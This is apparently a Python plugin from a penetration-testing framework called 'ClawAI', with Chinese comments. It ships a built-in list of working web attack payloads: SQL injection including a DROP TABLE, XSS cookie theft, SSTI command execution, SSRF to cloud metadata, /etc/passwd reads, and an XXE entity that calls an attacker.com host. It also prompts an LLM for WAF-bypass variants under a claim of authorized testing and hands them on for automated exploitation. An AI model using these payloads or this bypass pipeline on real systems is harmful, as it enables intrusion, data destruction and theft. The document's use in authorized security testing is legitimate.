# -*- coding: utf-8 -*-
"""
AI 辅助 Payload 生成器 - ClawAI Demo 插件
基于 LLM 的智能 Payload 生成，支持 WAF 绕过变体

工作流程：
  1. 读取当前 Findings（已发现的漏洞类型）
  2. 检测目标 WAF 类型（可选）
  3. 调用 LLM 生成针对性 Payload 变体
  4. 将生成的 Payload 注入回 Findings，供后续利用步骤使用
"""

import logging
import json
from typing import Any, Dict, List, Optional

logger = logging.getLogger("clawai.plugin.ai_payload_gen")


# ── 内置基础 Payload 库（无 LLM 时的回退方案）────────────────────────────────
_BUILTIN_PAYLOADS: Dict[str, List[str]] = {
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "1' AND SLEEP(5)--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; DROP TABLE users--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "<%= 7*7 %>",
    ],
    "ssrf": [
        "http://127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://[::1]/",
        "http://0x7f000001/",
    ],
    "rce": [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
    ],
    "lfi": [
        "../../etc/passwd",
        "....//....//etc/passwd",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "expect://id",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><test>&xxe;</test>',
    ],
}

# ── WAF 绕过策略模板（注入 LLM prompt）────────────────────────────────────────
_WAF_BYPASS_HINTS = {
    "cloudflare": "使用 Unicode 编码、混合大小写、注释分割等方式绕过 Cloudflare WAF",
    "modsecurity": "使用 HPP（HTTP 参数污染）、分块传输、多种编码组合绕过 ModSecurity",
    "aws_waf": "使用 URL 编码、JSON 路径注入等方式绕过 AWS WAF",
    "unknown": "生成多种编码变体（URL编码、Unicode、HTML实体、Base64拆分）提升绕过成功率",
}


class ClawAIPlugin:
    plugin_id: str = ""

    def run(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        raise NotImplementedError

    def health_check(self) -> Dict[str, Any]:
        return {"ok": True, "message": "ready"}


class AiPayloadGenPlugin(ClawAIPlugin):
    """AI 辅助 Payload 生成器主类"""

    plugin_id = "ai_payload_gen"

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self.model = self.config.get("model", "auto")
        self.vuln_types = self.config.get(
            "vuln_types", ["sqli", "xss", "ssti", "ssrf", "rce", "lfi", "xxe"]
        )
        self.variants_count = self.config.get("variants_count", 5)
        self.waf_aware = self.config.get("waf_aware", True)
        self.context_aware = self.config.get("context_aware", True)

    def run(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        根据已发现的漏洞生成针对性 Payload 变体

        Returns:
            findings: info 级别的 Finding，包含生成的 Payload 列表（供后续利用）
        """
        findings = []

        # 确定需要生成 Payload 的漏洞类型
        target_types = self._get_target_vuln_types(context)
        if not target_types:
            logger.info(f"[ai_payload_gen] 未找到需要生成 Payload 的漏洞类型")
            return findings

        # 检测 WAF 类型
        waf_type = "unknown"
        if self.waf_aware:
            waf_type = context.get("waf_detected", "unknown")
            logger.info(f"[ai_payload_gen] 检测到 WAF: {waf_type}")

        # 尝试调用 LLM
        llm_client = context.get("llm_client")

        for vuln_type in target_types:
            payloads = self._generate_payloads(vuln_type, waf_type, llm_client, context)

            findings.append({
                "type": "ai_generated_payloads",
                "title": f"[AI] {vuln_type.upper()} Payload 变体（{len(payloads)} 个）",
                "severity": "info",
                "description": (
                    f"AI 针对目标 WAF（{waf_type}）生成了 {len(payloads)} 个 "
                    f"{vuln_type} 漏洞利用 Payload 变体，可供手动测试或自动化利用使用。"
                ),
                "location": target,
                "evidence": "\n".join(f"  [{i+1}] {p}" for i, p in enumerate(payloads)),
                "remediation": "",
                "source": f"plugin:{self.plugin_id}",
                "metadata": {
                    "vuln_type": vuln_type,
                    "waf_type": waf_type,
                    "model": self.model,
                    "payloads": payloads,
                },
            })

        logger.info(f"[ai_payload_gen] 生成完成，共 {len(findings)} 种漏洞类型 Payload")
        return findings

    def _get_target_vuln_types(self, context: Dict[str, Any]) -> List[str]:
        """从 context Findings 中提取需要增强的漏洞类型"""
        if not self.context_aware:
            return self.vuln_types

        existing_findings = context.get("findings", [])
        found_types = set()
        for f in existing_findings:
            vuln_type = f.get("type", "").lower()
            for t in self.vuln_types:
                if t in vuln_type or vuln_type in t:
                    found_types.add(t)

        # 若无 Findings，则处理所有配置的类型
        return list(found_types) if found_types else self.vuln_types

    def _generate_payloads(self, vuln_type: str, waf_type: str,
                            llm_client: Any, context: Dict[str, Any]) -> List[str]:
        """生成 Payload，优先使用 LLM，回退到内置库"""
        base_payloads = _BUILTIN_PAYLOADS.get(vuln_type, [])

        if llm_client is None:
            logger.debug(f"[ai_payload_gen] 无 LLM 客户端，使用内置 Payload")
            return base_payloads[:self.variants_count]

        try:
            return self._llm_generate(vuln_type, waf_type, base_payloads, llm_client, context)
        except Exception as e:
            logger.warning(f"[ai_payload_gen] LLM 调用失败: {e}，回退到内置 Payload")
            return base_payloads[:self.variants_count]

    def _llm_generate(self, vuln_type: str, waf_type: str,
                       base_payloads: List[str], llm_client: Any,
                       context: Dict[str, Any]) -> List[str]:
        """调用 LLM 生成绕过变体 Payload"""
        tech_stack = context.get("tech_stack", "未知技术栈")
        waf_hint = _WAF_BYPASS_HINTS.get(waf_type, _WAF_BYPASS_HINTS["unknown"])

        prompt = f"""你是一名专业的 Web 安全研究员，正在进行授权渗透测试。

目标信息：
- 技术栈：{tech_stack}
- WAF 类型：{waf_type}
- 漏洞类型：{vuln_type}

已知基础 Payload：
{chr(10).join(f"  - {p}" for p in base_payloads[:3])}

任务：{waf_hint}。
请生成 {self.variants_count} 个针对该目标优化的 {vuln_type.upper()} Payload 变体。

要求：
1. 每行输出一个 Payload，不加编号和说明
2. 优先考虑实际绕过效果，而非理论变体
3. 如果是注入类 Payload，考虑目标数据库/框架特性
4. 仅输出 Payload 本身，不输出任何解释文字

Payload 列表："""

        # 调用 llm_client（ClawAI 框架注入的标准接口）
        response = llm_client.chat(
            messages=[{"role": "user", "content": prompt}],
            model=self.model if self.model != "auto" else None,
            temperature=0.7,
            max_tokens=512,
        )

        # 解析响应
        text = response.get("content", "")
        payloads = [line.strip() for line in text.splitlines()
                    if line.strip() and not line.strip().startswith("#")]
        return payloads[:self.variants_count] if payloads else base_payloads[:self.variants_count]

    def health_check(self) -> Dict[str, Any]:
        missing = [t for t in self.vuln_types if t not in _BUILTIN_PAYLOADS]
        if missing:
            return {"ok": True, "message": f"ready (内置库缺少类型: {missing}, 将依赖 LLM)"}
        return {"ok": True, "message": "ai_payload_gen ready"}


def create_plugin(config=None) -> AiPayloadGenPlugin:
    return AiPayloadGenPlugin(config=config)
